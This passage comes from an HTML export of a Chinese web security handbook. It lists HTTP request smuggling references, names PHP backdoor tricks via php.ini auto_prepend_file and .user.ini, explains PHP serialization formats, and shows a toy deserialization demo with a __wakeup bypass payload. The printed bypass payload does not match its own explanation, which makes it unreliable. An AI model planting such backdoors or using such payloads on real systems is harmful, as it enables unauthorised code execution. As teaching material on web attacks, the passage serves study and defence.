</span>–<span> HTTP/1.1</span></a></li><li><a href='https://tools.ietf.org/html/rfc7230'><span>RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing </span>–<span> HTTP/1.1</span></a></li></ul><h4 id='blog--whitepaper'><span>Blog / Whitepaper</span></h4><ul><li><a href='https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf'><span>HTTP Request Smuggling by chaiml</span></a></li><li><a href='https://portswigger.net/web-security/request-smuggling'><span>HTTP request smuggling by portswigger</span></a></li><li><a href='https://xz.aliyun.com/t/6654'><span>从一道题到协议层攻击之 HTTP 请求走私</span></a></li><li><a href='http://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf'><span>HTTP Request Smuggling in 2020</span></a></li><li><a href='https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c'><span>h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</span></a></li></ul><p><span id="_bookmark43" class="anchor"></span><span>CHAPTER 5</span></p><p>&nbsp;</p><h1 id='5--语言与框架'><span>5.  语言与框架</span></h1><h2 id='51--php'><span>5.1  PHP</span></h2><h3 id='后门-1'><span>后门</span></h3><h4 id='phpini-构成的后门'><span>php.ini 构成的后门</span></h4><blockquote><p><span>利用 auto_prepend_file 和 include_path</span></p></blockquote><h4 id='userini-文件构成的-php-后门'><span>.user.ini 文件构成的 PHP 后门</span></h4><blockquote><p><span>.user.ini 可运行于所有以 fastcgi 运行的 server。利用方式同 php.ini</span></p></blockquote><h3 id='反序列化-1'><span>反序列化</span></h3><h4 id='php-序列化实现'><span>PHP 序列化实现</span></h4><h4 id='常见处理器'><span>常见处理器</span></h4><blockquote><p><span>PHP 序列化处理共有几种，分别为 php、php_serialize、php_binary 和 WDDX(需要编译时开启支持)，默认为 php，可通过配置中的 session.serialize_handler 修改。</span></p></blockquote><blockquote><p><span>如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX 从 PHP 7.4 版本后开始弃用。从 PHP5.5.4 起可以使用 php_serialize。php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并 不会有 php 和 php_binary 所具有的限制。</span></p><p><span>其中 PHP 处理器的格式为：键名 + 竖线 + 经过 serialize() 函数序列化处理的值。</span></p><p><span>其中 php_binary 处理器的格式为：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处理的值。</span></p><p><span>其中 php_serialize 处理器的格式为：经过 serialize() 函数序列化处理的数组。</span></p></blockquote><h4 id='序列化格式'><span>序列化格式</span></h4><blockquote><p><span>其中 php_serialize 的实现在 php-src/ext/standard/var.c 中，主要函数为 php_var_serialize_intern，序列化后的格式如下：</span></p></blockquote><ul><li><h5 id='boolean'><span>boolean</span></h5><ul><li><span>b:</span><span>&lt;</span><span>value</span><span>&gt;</span><span>;</span></li><li><span>b:1; // true</span></li><li><span>b:0; // false</span></li></ul></li><li><h5 id='integer'><span>integer</span></h5><ul><li><span>i:</span><span>&lt;</span><span>value</span><span>&gt;</span><span>;</span></li></ul></li><li><h5 id='double'><span>double</span></h5><ul><li><span>d:</span><span>&lt;</span><span>value</span><span>&gt;</span><span>;</span></li></ul></li><li><h5 id='null'><span>NULL</span></h5><ul><li><span>N;</span></li></ul></li><li><h5 id='string'><span>string</span></h5><ul><li><span>s:</span><span>&lt;</span><span>length</span><span>&gt;</span><span>:</span><span>&quot;</span><span>&lt;</span><span>value</span><span>&gt;</span><span>&quot;</span><span>;</span></li><li><span>s:1:</span><span>&quot;</span><span>s</span><span>&quot;</span><span>;</span></li></ul></li><li><h5 id='array'><span>array</span></h5><ul><li><span>a:</span><span>&lt;</span><span>length</span><span>&gt;</span><span>:{key, value};</span></li><li><span>a:1:{s:4:</span><span>&quot;</span><span>key1</span><span>&quot;</span><span>;s:6:</span><span>&quot;</span><span>value1</span><span>&quot;</span><span>;} // array(</span><span>&quot;</span><span>key1</span><span>&quot;</span><span> =</span><span>&gt;</span><span> </span><span>&quot;</span><span>value1</span><span>&quot;</span><span>);</span></li></ul></li><li><h5 id='object'><span>object</span></h5><ul><li><span>O:</span><span>&lt;</span><span>class_name_length</span><span>&gt;</span><span>:</span><span>&quot;</span><span>&lt;</span><span>class_name</span><span>&gt;</span><span>&quot;</span><span>:</span><span>&lt;</span><span>number_of_properties</span><span>&gt;</span><span>:{</span><span>&lt;</span><span>properties</span><span>&gt;</span><span>};</span></li></ul></li><li><h5 id='reference'><span>reference</span></h5><ul><li><span>指针类型</span></li><li><span>R:reference;</span></li><li><span>O:1:</span><span>&quot;</span><span>A</span><span>&quot;</span><span>:2:{s:1:</span><span>&quot;</span><span>a</span><span>&quot;</span><span>;i:1;s:1:</span><span>&quot;</span><span>b</span><span>&quot;</span><span>;R:2;}</span></li><li><span>$a = new A();</span><span>$</span><span>a-</span><span>&gt;</span><span>a=1;</span><span>$</span><span>a-</span><span>&gt;</span><span>b=&amp;</span><span>$</span><span>a-</span><span>&gt;</span><span>a;</span></li></ul></li></ul><h4 id='private-与-protect'><span>private 与 protect</span></h4><blockquote><p><span>private 与 protect 变量和 public 变量不同，不能直接设置。</span></p><p><span>private 属性只能在其被定义的类内部访问， 不会被继承，在属性前加上类名，即 %00className%00 用于标定其是私有的。</span></p><p><span>protected 属性可以在父类和子类中访问，变量前添加 %00</span><span>*</span><span>%00 用于标定其是受保护的。</span></p></blockquote><h4 id='php-反序列化漏洞'><span>PHP 反序列化漏洞</span></h4><blockquote><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.32812px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">php 在反序列化的时候会调用 __wakeup / __sleep 等函数，可能会造成代码执行等问题。若没有相关函数，</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">在析构时也会调用相关的析构函数，同样会造成代码执行。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">另外 __toString / __call 两个函数也有利用的可能。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">其中 __wakeup 在反序列化时被触发，__destruct 在 GC 时被触发，__toString 在 echo 时被触发, __call在一个未被定义的函数调用时被触发。</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 136px;"></div><div class="CodeMirror-gutters" style="height: 136px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>在一个未被定义的函数调用时被触发。下面提供一个简单的 demo.</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>19</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">class</span> <span class="cm-def">Demo</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-keyword">public</span> <span class="cm-variable-2">$data</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">__construct</span>(<span class="cm-variable-2">$data</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">data</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$data</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-keyword">echo</span> <span class="cm-string">"construct&lt;br /&gt;"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">__wakeup</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-tab" role="presentation" cm-text="	">   </span><span class="cm-keyword">echo</span> <span class="cm-string">"wake up&lt;br /&gt;"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">__destruct</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-keyword">echo</span> <span class="cm-string">"Data's value is </span><span class="cm-variable-2">$this</span>-&gt;<span class="cm-variable">data</span><span class="cm-string">. &lt;br /&gt;"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-keyword">echo</span> <span class="cm-string">"destruct&lt;br /&gt;"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">var_dump</span>(<span class="cm-builtin">serialize</span>(<span class="cm-keyword">new</span> <span class="cm-variable">Demo</span>(<span class="cm-string">"raw value"</span>)));</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 431px;"></div><div class="CodeMirror-gutters" style="height: 431px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></blockquote><blockquote><h6 id='输出-1'><span>输出</span></h6><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">construct</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Data</span><span class="cm-string">'s value is raw value.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">destruct</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">string(44) "O:4:"Demo":1:{s:4:"data";s:9:"raw value";}"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>把序列化的字符串修改一下后，执行 unserialize(</span><span>&#39;</span><span>O:4:</span><span>&quot;</span><span>Demo</span><span>&quot;</span><span>:1:{s:4:</span><span>&quot;</span><span>data</span><span>&quot;</span><span>;s:15:</span><span>&quot;</span><span>malicious value</span><span>&quot;</span><span>;}</span><span>&#39;</span><span>);</span></p><h6 id='输出-2'><span>输出</span></h6><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">wake</span> <span class="cm-variable">up</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Data</span><span class="cm-string">'s value is malicious value.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">destruct</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>这里看到，值被修改了.</span></p><p><span>上面是一个 unserialize() 的简单应用，不难看出，如果 </span><span>_</span><span>_</span><span>wakeup() 或者 __desturct() 有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。</span></p><p><span>那么，在 </span><span>_</span><span>_</span><span>wakeup() 中加入判断是否可以阻止这个漏洞呢？在 </span><span>_</span><span>_</span><span>wakeup() 中我们加入一行代码</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>5</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">__wakeup</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-keyword">if</span>(<span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">data</span> <span class="cm-operator">!=</span> <span class="cm-string">'raw value'</span>) <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">data</span> <span class="cm-operator">=</span> <span class="cm-string">'raw value'</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-keyword">echo</span> <span class="cm-string">"wake up&lt;br /&gt;"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="height: 113px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>但其实还是可以绕过的，在 PHP5 </span><span>&lt;</span><span> 5.6.25，PHP7 </span><span>&lt;</span><span> 7.0.10 的版本都存在 wakeup 的漏洞。当反序列化中</span></p><p><span>object 的个数和之前的个数不等时，wakeup 就会被绕过，于是使用下面的 payload</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">unserialize</span>(<span class="cm-string">'O:7:"HITCON":1:{s:4:"data";s:15:"malicious value";}'</span>);</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h6 id='输出-3'><span>输出</span></h6><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div 